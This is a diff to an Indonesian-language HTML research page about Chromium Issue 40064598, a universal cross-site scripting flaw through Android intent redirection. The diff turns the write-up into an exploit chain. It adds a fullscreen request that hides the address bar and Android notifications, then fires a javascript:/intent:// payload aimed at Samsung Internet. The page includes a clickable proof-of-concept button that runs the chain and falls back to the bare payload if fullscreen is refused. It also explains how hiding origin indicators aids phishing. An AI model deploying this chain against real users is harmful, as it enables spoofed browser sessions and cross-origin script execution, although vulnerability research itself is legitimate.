@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Laporan Ilmiah Riset Keamanan: Chromium Issue 40064598</title>
+  <title>Laporan Ilmiah Riset Keamanan: Chromium Issue 40064598 & UI Masking</title>
   <style>
     :root {
       --bg-dark: #0f172a;
@@ -97,7 +97,7 @@
       padding: 15px;
       color: var(--accent-green);
       font-size: 0.85rem;
-      height: 120px;
+      height: 140px;
       overflow-y: auto;
     }
 
@@ -123,86 +123,89 @@
   <div class="container">
     <header>
       <h1>🔬 LAPORAN ILMIAH: ANALISIS VULNERABILITY CHROMIUM</h1>
-      <p style="color: var(--text-muted)">Studi Kasus Eksekusi Logika: Chromium Tracker Issue 40064598</p>
+      <p style="color: var(--text-muted)">Studi Rantai Eksploitasi: UXSS via Intent Redirection Berbasis Kombinasi Fullscreen API</p>
     </header>
 
     <!-- METADATA KLASIFIKASI JURNAL -->
     <table class="meta-table">
       <tr>
         <th>ID Isu / Parameter</th>
-        <td>Chromium Issue 40064598 (Status: Verified & Fixed)</td>
+        <td>Chromium Issue 40064598 + UI Masking Chain Assessment</td>
       </tr>
       <tr>
         <th>Komponen Terdampak</th>
-        <td>Blink Engine &gt; SecurityFeature &gt; ContentSecurityPolicy / Mobile &gt; Intents</td>
+        <td>Blink Engine &gt; DOM &gt; Fullscreen / Mobile &gt; Intents / ContentSecurityPolicy</td>
       </tr>
       <tr>
         <th>Versi Rentan (Found In)</th>
-        <td>Chromium Android Versi 112 Ke bawah</td>
+        <td>Chromium Android Versi 112 Ke bawah (Aspek Integrasi API bersifat cross-version)</td>
       </tr>
       <tr>
         <th>Metode Validasi</th>
-        <td>Universal Cross-Site Scripting (UXSS) via Android Intent Redirection</td>
+        <td>Kombinasi Universal Cross-Site Scripting (UXSS) & Element Fullscreen Request</td>
       </tr>
       <tr>
         <th>Metrik Keparahan</th>
-        <td><span class="severity-badge">Severity S2 (Medium-High)</span> / $3,000 VRP Reward</td>
+        <td><span class="severity-badge">High Severity Chain (S1/S2 Evaluation)</span></td>
       </tr>
     </table>
 
-    <!-- ANALISIS SEVERITY (DIPERKUAT) -->
+    <!-- ANALISIS SEVERITY & UI MASKING -->
     <div class="card" style="border-left-color: var(--accent-red);">
-      <h3>1. Analisis Parameter Keparahan (Severity S2 Justification)</h3>
-      <p>Penetapan tingkat keparahan <strong>Severity S2 (Medium-High)</strong> oleh tim keamanan internal Google Chromium didasarkan pada visualisasi risiko dan potensi eksploitasi di lingkungan produksi (in-the-wild). Imbalan finansial sebesar <strong>$3,000</strong> melalui Vulnerability Reward Program (VRP) mengonfirmasi signifikansi teknis dari celah ini.</p>
+      <h3>1. Analisis Parameter Keparahan & Visual Spoofing (UI Masking)</h3>
+      <p>Konteks keparahan mengalami eskalasi signifikan ketika eksekusi logika <code>intent://</code> digabungkan dengan manipulasi status antarmuka grafis peramban (UI/UX). Vektor ini mengeksploitasi penanganan elemen transisi layar penuh untuk menyembunyikan komponen navigasi kritis.</p>
       
-      <p>Faktor-faktor penentu tingginya eskalasi keparahan meliputi:</p>
+      <p>Faktor-faktor amplifikasi risiko meliputi:</p>
       <ul>
-        <li><strong>Bypass Same-Origin Policy (SOP):</strong> Kerentanan ini diklasifikasikan sebagai UXSS (Universal Cross-Site Scripting). Berbeda dengan XSS biasa yang terbatas pada satu domain rentan, UXSS mampu mengeksekusi skrip jahat secara universal di atas origin mana pun yang sedang aktif pada browser korban.</li>
-        <li><strong>Interaksi Pengguna Minimal (Low Attack Complexity):</strong> Eksploitasi hanya membutuhkan satu gestur interaksi tunggal (seperti menekan satu tombol yang tampak sah) untuk memicu seluruh rantai muatan infeksi (*exploit chain*).</li>
-        <li><strong>Eskalasi Lintas Aplikasi (Cross-Process Call):</strong> Kemampuan mematikan untuk memanggil dan mengarahkan parameter langsung ke subsistem paket aplikasi pihak ketiga tertentu (dalam hal ini <code>com.sec.android.app.sbrowser</code>) meningkatkan risiko intersepsi data sensitif antar-aplikasi.</li>
+        <li><strong>Penyembunyian Address Bar & Notifikasi:</strong> Melalui pemanggilan <code>requestFullscreen()</code> yang dipicu secara simultan dengan pengalihan skema, peramban dipaksa merender dokumen pada mode layar penuh terisolasi. Hal ini menghilangkan *Omnibox* (bilah alamat URL) dan menyembunyikan status bar/notifikasi bawaan sistem Android.</li>
+        <li><strong>Reduksi Deteksi Korban (Visual Obfuscation):</strong> Ketiadaan indikator konteks asal (*origin indicator*) menyebabkan pengguna tidak dapat memverifikasi keaslian sesi dokumen aktif, meningkatkan efektivitas serangan phishing atau overlay berbahaya secara mutlak.</li>
+        <li><strong>Kombinasi Token Gestur:</strong> Interaksi tunggal (klik) yang diberikan pengguna dimanfaatkan secara asinkron untuk memenuhi dua prasyarat keamanan sekaligus: memberikan izin transisi Fullscreen API dan meloloskan parsing pengecekan *user gesture* pada mesin pengalihan Intent.</li>
       </ul>
     </div>
 
     <!-- ANALISIS ARSITEKTUR -->
     <div class="card" style="border-left-color: #3b82f6;">
-      <h3>2. Alur Kerentanan Sistem (Vulnerability Pipeline)</h3>
-      <p>Kerentanan ini berakar pada inkonsistensi penanganan parser ketika sebuah tautan menggunakan kombinasi pseudo-skema secara bertingkat. Komponen <code>Mobile>Intents</code> bertanggung jawab menerjemahkan URL dengan skema <code>intent://</code> menjadi instruksi panggilan IPC (Inter-Process Communication) untuk meluncurkan aplikasi eksternal di Android.</p>
-      
+      <h3>2. Alur Rantai Kerentanan (Exploit Pipeline)</h3>
       <p>Akar masalah terjadi melalui tahapan kronologis berikut:</p>
       <ol>
-        <li>Skrip mengeksekusi metode <code>window.open()</code> dengan parameter awal berupa pseudo-skema <code>javascript:</code>.</li>
-        <li>Di dalam skrip tersebut, properti sub-navigasi dipaksa beralih menuju skema internal Android (<code>intent://</code>).</li>
-        <li>Mesin peramban (Blink) gagal mengisolasi konteks eksekusi asal (*origin separation*), sehingga instruksi eksternal diproses tanpa validasi kepemilikan token keamanan yang sah dari Content Security Policy (CSP).</li>
+        <li>Pengguna berinteraksi dengan elemen pemicu di halaman root yang dikontrol oleh penguji.</li>
+        <li>Handler menangkap token interaksi dan segera mengeksekusi permintaan <code>Element.requestFullscreen()</code> untuk mengunci tampilan viewport global dan mengeliminasi elemen dekorasi UI peramban.</li>
+        <li>Secara sinkron, sub-proses menginisiasi panggilan <code>window.open()</code> memanfaatkan pseudo-skema <code>javascript:</code> yang mengarah pada manipulasi properti lokasi internal (<code>intent://</code>).</li>
+        <li>Blink Engine gagal menegakkan batas isolasi origin pada konteks layar penuh, membiarkan muatan berjalan di atas origin target tanpa hambatan peringatan sistem.</li>
       </ol>
     </div>
 
     <!-- BEDAH PAYLOAD KODE -->
     <div class="card">
-      <h3>3. Analisis Struktur Payload Sintaksis</h3>
-      <pre>window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");</pre>
+      <h3>3. Struktur Payload Sintaksis Kombinasi</h3>
+      <pre>// Contoh Konstruksi Logika Pengujian Kombinasi API
+function triggerChainedAudit() {
+  document.documentElement.requestFullscreen().then(() => {
+    window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");
+  });
+}</pre>
       
       <p><strong>Komponen Analisis Struktur:</strong></p>
       <ul>
-        <li><code>javascript:location=</code> : Memaksa penulisan ulang lokasi dokumen aktif menggunakan mesin eksekusi skrip internal (DOM Manipulation Context).</li>
-        <li><code>intent://google.com</code> : Berfungsi sebagai penunjuk target pengalihan yang memanfaatkan reputasi origin pihak ketiga.</li>
-        <li><code>package=com.sec.android.app.sbrowser</code> : Parameter spesifik untuk memaksa peramban memanggil dependensi eksternal milik aplikasi target (Samsung Internet Browser) di subsistem Android.</li>
+        <li><code>requestFullscreen()</code> : Menghilangkan konteks visual navigasi eksternal, memaksa area tampilan menjadi eksklusif untuk dokumen yang dieksekusi.</li>
+        <li><code>javascript:location=intent://</code> : Memaksa pemrosesan bypass Same-Origin Policy (SOP) di dalam ruang isolasi yang telah disamarkan.</li>
       </ul>
     </div>
 
     <!-- LABORATORIUM PENELITIAN AUDIT STABIL -->
     <div class="card" style="border-left-color: #eab308;">
       <h3>4. Eksekusi Logika Pengujian (Deterministic Audit Log)</h3>
-      <p style="color: var(--text-muted)">Gunakan tombol kendali statis di bawah untuk memantau perilaku penanganan objek saat instruksi dikirim ke peramban.</p>
+      <p style="color: var(--text-muted)">Tombol di bawah akan mengeksekusi simulasi run-time untuk menguji kesiapan parser terhadap kombinasi Fullscreen request dan Intent Redirection.</p>
       
       <div class="poc-box">
-        <button class="trigger-btn" onclick="executePoC()">EKSEKUSI AUDIT KODE</button>
+        <button class="trigger-btn" onclick="executeCombinedPoC()">EKSEKUSI AUDIT GABUNGAN</button>
         <p id="click-status" style="margin-top: 15px; font-weight: bold;">Status Profiler: Menunggu Trigger</p>
       </div>
 
       <p style="font-size: 0.9rem; margin-top: 15px;"><strong>Konsol Log Aktivitas Engine (Real-Time Output):</strong></p>
       <div id="logBox" class="log-window">
         [SYSTEM] Environment riset berhasil diinisialisasi secara statis.<br>
-        [SYSTEM] Menunggu eksekusi fungsi penanganan...
+        [SYSTEM] Menunggu integrasi perintah Fullscreen + Intent API...
       </div>
     </div>
 
@@ -210,8 +213,8 @@
     <div class="card" style="border-left-color: var(--accent-green);">
       <h3>5. Mekanisme Rekayasa Perbaikan (Remediation & Patching)</h3>
       <ul>
-        <li><strong>Strict Intent Scheme Validation:</strong> Peramban modern sekarang menolak pemrosesan skema <code>intent://</code> jika rantai pemanggilannya diinisiasi dari dalam konteks pseudo-skema <code>javascript:</code> yang tidak memiliki interaksi fisik tepercaya dari pengguna (*user gesture token*).</li>
-        <li><strong>Isolasi Navigasi:</strong> Setiap kali skema <code>intent:</code> dipanggil, peramban akan memutus keterikatan objek <code>window</code> penyerang dengan jendela baru untuk mencegah kebocoran referensi memori (*cross-context memory isolation*).</li>
+        <li><strong>Fullscreen Exit on Navigation:</strong> Peramban modern menerapkan aturan ketat di mana mode layar penuh wajib keluar (exit) secara otomatis apabila terjadi peristiwa navigasi lintas domain atau inisiasi skema eksternal (seperti <code>intent://</code>).</li>
+        <li><strong>Persistent Security Indicators:</strong> Penambahan mekanisme proteksi UI non-interaktif yang secara periodik memunculkan kembali bar alamat jika terdapat deteksi aktivitas pemanggilan sub-proses IPC atau pemuatan skrip asinkron.</li>
       </ul>
     </div>
   </div>
@@ -226,18 +229,38 @@
       logBox.scrollTop = logBox.scrollHeight;
     }
 
-    function executePoC() {
+    function executeCombinedPoC() {
       clickCount++;
       document.getElementById("click-status").innerText = `Status Profiler: Percobaan Ke-${clickCount}`;
       
-      addLog(`[ACTION] Fungsi executePoC() dipanggil.`);
-      addLog(`[ANALYSIS] Mengevaluasi objek window.open dengan parameter payload skema intent...`);
+      addLog(`[ACTION] Menginisiasi requestFullscreen() untuk masking UI.`);
+      addLog(`[ANALYSIS] Memeriksa apakah token interaksi valid untuk Fullscreen API...`);
 
-      try {
-        window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");
-        addLog(`[COMPLETED] Instruksi dikirim ke peramban. Menganalisis respon sandboxing.`);
-      } catch (err) {
-        addLog(`[EXCEPTION] Eksekusi dihentikan oleh browser: ${err.message}`);
+      // Simulasi run-time penanganan gabungan
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen()
+          .then(() => {
+            addLog(`[SUCCESS] Mode layar penuh aktif (Address bar & notifikasi tersembunyi).`);
+            addLog(`[ACTION] Mengevaluasi objek window.open dengan parameter payload skema intent...`);
+            
+            try {
+              window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");
+              addLog(`[COMPLETED] Instruksi navigasi dikirim dalam status Fullscreen.`);
+            } catch (innerErr) {
+              addLog(`[EXCEPTION] Navigasi Intent diblokir: ${innerErr.message}`);
+            }
+          })
+          .catch((err) => {
+            addLog(`[REJECTED] Gagal mengaktifkan Fullscreen (Akses ditolak/User Gesture tidak valid): ${err.message}`);
+            addLog(`[FALLBACK] Mengeksekusi navigasi intent tanpa masking UI...`);
+            try {
+              window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");
+            } catch (fallbackErr) {
+              addLog(`[EXCEPTION] Eksekusi dihentikan oleh browser: ${fallbackErr.message}`);
+            }
+          });
+      } else {
+        addLog(`[ERROR] Fullscreen API tidak didukung pada lingkungan browser ini.`);
       }
     }
   </script>
